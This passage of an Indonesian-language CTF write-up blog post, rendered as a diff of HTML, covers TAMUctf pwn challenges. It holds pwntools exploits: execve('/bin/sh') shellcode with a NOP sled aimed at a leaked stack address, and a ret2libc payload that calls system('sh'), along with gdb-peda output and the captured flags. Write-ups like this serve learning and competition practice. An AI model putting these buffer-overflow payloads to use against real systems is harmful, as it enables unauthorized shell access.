+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn.ctf.tamu.edu&#34;</span>, <span style="color:#ae81ff">4323</span>)
+
+sh <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+sh <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;xor eax,eax&#34;</span>)
+sh <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;xor ecx,ecx&#34;</span>)
+sh <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;push eax&#34;</span>)
+sh <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;push 0x68732f2f&#34;</span>)
+sh <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;push 0x6e69622f&#34;</span>)
+sh <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;lea ebx,[esp]&#34;</span>)
+sh <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;mov al,11&#34;</span>)
+sh <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;int 0x80&#34;</span>)
+ 
+r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your random number &#34;</span>)
+stack_addr <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;!&#34;</span>)[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">16</span>)
+
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Stack Addr : {}&#34;</span><span style="color:#f92672">.</span>format(hex(stack_addr))
+
+payload <span style="color:#f92672">=</span> sh <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">242</span><span style="color:#f92672">-</span>len(sh))<span style="color:#f92672">+</span> p32(stack_addr)
+r<span style="color:#f92672">.</span>sendline(payload)
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h3 id="flag--gigemn0w_w3_4r3_g377in6_s74r73d">Flag : gigem{n0w_w3_4r3_g377in6_s74r73d}</h3>
+<h2 id="pwn4">Pwn4</h2>
+<p>Diberikan sebuah file binary dengan informasi berikut</p>
+<!-- raw HTML omitted -->
+<p>Pada pwn4 menggunakan teknik <code>Ret2Libc</code>.</p>
+<p>Payload adalah sebagai berikut :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Pattern +  function_addr + return_address + function_argument
+</code></pre></div><p>Pada pwn4 payload seperti berikut :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;A&#34;</span> * <span style="color:#ae81ff">32</span> +  system_addr + <span style="color:#e6db74">&#34;JUNK&#34;</span> + sh_string
+</code></pre></div><p>sh_string adalah string <code>sh</code> didapatkan dari menggunakan <code>find</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ find <span style="color:#e6db74">&#34;sh&#34;</span>
+Searching <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;sh&#39;</span> in: None ranges
+Found <span style="color:#ae81ff">99</span> results, display max <span style="color:#ae81ff">99</span> items:
+      ....
+      pwn4 : 0x804a03d --&gt; 0x60006873 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sh&#39;</span><span style="color:#f92672">)</span>
+      ....
+</code></pre></div><p>Pada bagian return address diisi dengan <code>JUNK</code> karena memang diperlukan apabila sudah mendapatkan interactive shell.</p>
+<p>Dan system_addr adalah fungsi <code>system()</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ pdisass cal
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> cal:
+   0x080485b2 &lt;+14&gt;:    call   0x8048430 &lt;system@plt&gt;
+</code></pre></div><p>Berikut exploit code nya</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+
+sh_string <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x804a03d</span>)
+system_addr <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x8048430</span>)
+
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn.ctf.tamu.edu&#34;</span>, <span style="color:#ae81ff">4324</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span>  system_addr <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;JUNK&#34;</span> <span style="color:#f92672">+</span> sh_string
+r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Input&gt; &#34;</span>)
+r<span style="color:#f92672">.</span>sendline(payload)
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h3 id="flag--gigemb4ck_70_7h3_l1br4ry">Flag : gigem{b4ck_70_7h3_l1br4ry}</h3>
+<h1 id="pwn5">Pwn5</h1>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="rhamaa.github.io/post/2016-12-22-suctf2016-unloadme/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">SharifCTF 2016 - UnloadMe</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="rhamaa.github.io/post/2017-12-05-tpctf-2017-write-up/">
+                  <span class="button__text">TPCTF 2017 - Write up</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="rhamaa.github.io/assets/main.js"></script>
+<script src="rhamaa.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
